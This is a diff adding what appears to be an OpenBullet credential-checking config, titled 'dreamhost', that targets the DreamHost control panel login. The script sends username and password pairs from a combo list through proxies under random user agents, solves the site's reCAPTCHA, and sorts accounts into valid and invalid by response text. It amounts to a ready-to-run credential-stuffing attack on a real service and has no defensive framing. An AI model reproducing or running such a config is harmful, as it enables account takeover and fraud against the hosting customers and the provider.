@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "dreamhost",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-09T01:03:27.8086211+00:00",
+  "AdditionalInfo": "",
+  "Author": "soot",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+FUNCTION GetRandomUA "" -> VAR "RANDUA" 
+#REQUEST1 REQUEST GET "https://panel.dreamhost.com/index.cgi" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: <RANDUA>" 
+  HEADER "Pragma: no-cache" 
+#REQUEST2 REQUEST POST "https://panel.dreamhost.com/index.cgi" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&Nscmd=Nlogin" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: <RANDUA>" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Email or password is incorrect" 
+    KEY "Your password has expired! " 
+  KEYCHAIN Success OR 
+    KEY "recaptcha" 
+    KEY "2-fa" 
+    KEY "panel-search-form\">" 
+RECAPTCHA "https://panel.dreamhost.com/index.cgi" "6LfFNAIAAAAAAKcHjSK6GNsmZJZe9nBlVmxNwDkD" -> VAR "RECAP" 
+#REQUEST3 REQUEST POST "https://panel.dreamhost.com/index.cgi" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&g-recaptcha-response=<RECAP>&Nscmd=Nlogin" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: <RANDUA>" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Email or password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "panel-search-form\">" 
